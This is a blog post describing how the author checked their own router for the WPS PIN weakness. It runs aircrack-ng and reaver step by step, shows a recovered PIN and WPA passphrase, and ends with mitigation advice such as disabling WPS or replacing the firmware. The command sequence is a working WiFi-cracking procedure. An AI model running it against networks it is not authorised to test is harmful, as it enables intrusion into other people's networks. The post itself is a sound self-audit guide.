---
title: "Is My Access Point Vulnerable To A WPS Attack?"
slug: access-point-vulnerable-wps-attack
date: 2017-08-23 00:00:00
---

In order to test this, you **must** have a WiFi card with monitor mode. The [
Penguin Wireless N USB Adapter for GNU / Linux (TPE-N150USB)](https://www.thinkpenguin.com/gnu-linux/penguin-wireless-n-usb-adapter-gnu-linux-tpe-n150usb) worked well for me.

![TPE-N150USB](https://www.thinkpenguin.com/files/wireless-n-usb-adapter-zero-1.jpg)

ThinkPenguin USB WiFi cards typically use Atheros chipsets, and because ThinkPenguin uses predictable chipsets you can be certain [you _will_ receive an Atheros chipset for this device](https://www.thinkpenguin.com/about). With this card, you can use monitor mode. The range not be great, but if you are testing the security of your own home network, range should not matter much.

Install the necessary tools.

```
sudo apt-get install \
	aircrack-ng \
	reaver
```

Disable your WiFi interface.

```
sudo ifconfig wlan0 down
```

Enable monitor mode for your WiFi interface.

```
sudo airmon-ng start wlan0
```

Note the name of the monitoring device output from the command above. In my case, it is `wlan0mon`.

Kill processes that may conflict with airmon tools.

```
sudo airmon-ng check kill
```

Scan for a network. `PWR` indicates signal strength. A number like `-20` is superior to a number like `-74`. The greater number is superior, and `-20` is greater than `-74`.

```
sudo airodump-ng wlan0mon
```

Try to test for the WPS vulnerability against the AP using `reaver`, which is specifically designed for this exploit. Specify your device's channel with `-c` and the BSSID (mac of the router) with `-b`.

```
sudo reaver \
	-i wlan0mon \
	-b 22:46:BA:34:CB:18 \
	-vv \
	-L \
	-N \
	-d 30 \
	-T 1
```

If your access point is vulnerable, the WPS pin will eventually be discovered.

```
[+] Pin cracked in 273832 seconds
[+] WPS PIN: '29701453'
[+] WPA PSK: 'thepassword123'
[+] AP SSID: 'MyAccessPoint'
```

Success!

_If `reaver` only shows you the PIN and not the `PSK`, you can find it like so._

```
sudo reaver \
	-i wlan0mon \
	-p 29701453 \
	-b 22:46:BA:34:CB:18 \
	-vv
```

My router was compromised in 273832 seconds, which is just over 3 days.

My [Netgear WNR2000v3](https://www.netgear.com/support/product/WNR2000v3.aspx) was then updated to the latest firmware as listed here.

```
Current Firmware Version:     V1.0.1.26
New Firmware Version:         V1.1.2.18

Current GUI Language Version: V1.0.0.55
New GUI Language Version:     V1.0.0.175
```

This upgrade automatically enables a 3 second lockout for failed WPS attempts.

Unfortunately, `reaver` did **not** seem to care, and went to work hacking the PIN just as it did before. It was not affected by that lockout setting.

I then disabled WPS entirely in the admin interface. As [many](https://lifehacker.com/5873407/how-to-crack-a-wi-fi-networks-wpa-password-with-reaver) [articles](https://arstechnica.com/information-technology/2012/01/hands-on-hacking-wifi-protected-setup-with-reaver/) [mention](https://www.howtogeek.com/176124/wi-fi-protected-setup-wps-is-insecure-heres-why-you-should-disable-it/), some routers don't _actually_ disable WPS even if the interface implies it is disabled.

In cases like that, it seems the only reliable preventative measure is to either get a router that actually disables WPS, or install [DD-WRT](https://www.dd-wrt.com/site/), [OpenWRT](https://openwrt.org/), or [LEDE](https://lede-project.org/) on your router.

Fortunately, this firmware upgrade along with disabling WPS actually worked in my case, and `reaver` was **unable to determine my PIN**.

# Citations

* [Constant receive timeout (0x03), or WPS transaction fail (0x02) with rtl8187](https://github.com/shift/reaver-wps/issues/183)
* [WPS Cracking with Reaver](https://www.pwnieexpress.com/blog/wps-cracking-with-reaver)
* [How to Crack a Wi-Fi Network's WPA Password with Reaver](https://lifehacker.com/5873407/how-to-crack-a-wi-fi-networks-wpa-password-with-reaver)
* [Hands-on: hacking WiFi Protected Setup with Reaver](https://arstechnica.com/information-technology/2012/01/hands-on-hacking-wifi-protected-setup-with-reaver/)
* [Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
* [How do I install bully and mdk3 on Ubuntu 16.04 (Xenial Xerus)?](https://askubuntu.com/questions/867071/how-do-i-install-bully-and-mdk3-on-ubuntu-16-04-xenial-xerus)
* [aireplay invalid destination MAC address](https://forum.aircrack-ng.org/index.php?topic=1495.0)
